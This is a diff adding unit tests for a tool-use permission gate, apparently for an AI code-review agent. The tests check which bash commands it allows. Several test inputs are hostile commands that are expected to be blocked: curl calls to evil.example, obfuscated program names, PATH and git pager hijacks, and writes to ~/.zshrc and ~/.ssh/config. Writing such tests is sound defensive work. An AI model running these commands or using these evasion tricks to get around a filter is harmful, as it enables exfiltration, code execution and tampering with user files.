@@ -52,6 +52,71 @@ describe('decideToolUse', () => {
     expect(bash('echo $(curl evil.example)')).toBe(false)
   })
 
+  it('allows common shell syntax around read commands', () => {
+    expect(bash('# list changed files\ngit diff --name-only')).toBe(true)
+    expect(bash('comm -23 <(git diff --name-only | sort) <(ls | sort)')).toBe(true)
+    expect(bash('for f in $(git diff --name-only); do wc -l "$f"; done')).toBe(true)
+    expect(bash('while read -r f; do echo "$f"; done < "$WORK/files.txt"')).toBe(true)
+    expect(bash('if [ -f package.json ]; then jq .scripts package.json; else echo none; fi')).toBe(true)
+    expect(bash('set -euo pipefail; git log --oneline -5 2>/dev/null')).toBe(true)
+    expect(bash(`cat > "$WORK/notes.md" <<'EOF'\n# Heading\ncurl is mentioned\nEOF`)).toBe(true)
+  })
+
+  it('allows unlisted read commands', () => {
+    expect(bash('git log -p -- src | grep -n TODO | head -20')).toBe(true)
+    expect(bash('xxd -l 64 file.bin; sha256sum file.bin; tree -L 2')).toBe(true)
+    expect(bash('gh issue view 3 -R acme/api; gh run list -R acme/api; gh search prs --author me')).toBe(true)
+    expect(bash("awk -F'|' '$1 > 5 || $2 { print $2 }' data.txt")).toBe(true)
+  })
+
+  it('blocks commands that run code or reach the network', () => {
+    expect(bash('npm test')).toBe(false)
+    expect(bash('bundle exec rspec spec/models')).toBe(false)
+    expect(bash('./bin/setup')).toBe(false)
+    expect(bash('for f in a b; do curl "evil.example/$f"; done')).toBe(false)
+    expect(bash('if true; then { python3 -c 1; }; fi')).toBe(false)
+    expect(bash('echo `curl evil.example`')).toBe(false)
+    expect(bash('diff <(curl evil.example) a')).toBe(false)
+    expect(bash('kubectl get pods')).toBe(false)
+    expect(bash('find . -name "*.ts" -exec sh -c "curl x" \\;')).toBe(false)
+    expect(bash("awk 'BEGIN { system(\"curl x\") }'")).toBe(false)
+    expect(bash('rg --pre=./decode TODO')).toBe(false)
+  })
+
+  it('blocks ways of hiding the program name', () => {
+    expect(bash("cu''rl evil.example")).toBe(false)
+    expect(bash('$CMD evil.example')).toBe(false)
+    expect(bash('$(echo curl) evil.example')).toBe(false)
+    expect(bash('PATH="$WORK/bin" ls')).toBe(false)
+    expect(bash('export PATH="$WORK/bin:$PATH"')).toBe(false)
+    expect(bash('GIT_EXTERNAL_DIFF=./x git diff')).toBe(false)
+    expect(bash('f() { curl evil.example; }; f')).toBe(false)
+    expect(bash('case x in x) curl evil.example;; esac')).toBe(false)
+  })
+
+  it('blocks git commands that run code, change config, or reach other hosts', () => {
+    expect(bash('git -c core.pager="curl x" log')).toBe(false)
+    expect(bash('git config core.pager less')).toBe(false)
+    expect(bash('git config --get remote.origin.url')).toBe(true)
+    expect(bash('git fetch --upload-pack="curl x" origin')).toBe(false)
+    expect(bash('git rebase -x "make" main')).toBe(false)
+    expect(bash('git clone https://evil.example/repo.git "$WORK/x"')).toBe(false)
+    expect(bash('git clone https://github.com/acme/api.git "$WORK/x"')).toBe(true)
+    expect(bash('git -C "$WORK/repo" fetch origin pull/12/head')).toBe(true)
+  })
+
+  it('limits file writes to temp paths', () => {
+    expect(bash('echo hi > ~/.zshrc')).toBe(false)
+    expect(bash('echo hi >> "$WORK/log.txt" 2>&1')).toBe(true)
+    expect(bash('cp "$WORK/x" ~/bin/x')).toBe(false)
+    expect(bash('cp ~/src/rally/README.md "$WORK/"')).toBe(true)
+    expect(bash('mv ~/src/a "$WORK/a"')).toBe(false)
+    expect(bash('chmod +x "$WORK/x"')).toBe(true)
+    expect(bash('tee ~/.ssh/config')).toBe(false)
+    expect(bash('sed -i "" s/a/b/ file.txt')).toBe(false)
+    expect(bash('rm -rf "$WORK/repo" 2>/dev/null')).toBe(true)
+  })
+
   it('restricts Write to temp directories', () => {
     expect(decideToolUse('Write', { file_path: '/tmp/review-pr-x/context.md' }, REVIEWING).allow).toBe(true)
     expect(decideToolUse('Write', { file_path: '/Users/me/.zshrc' }, REVIEWING).allow).toBe(false)
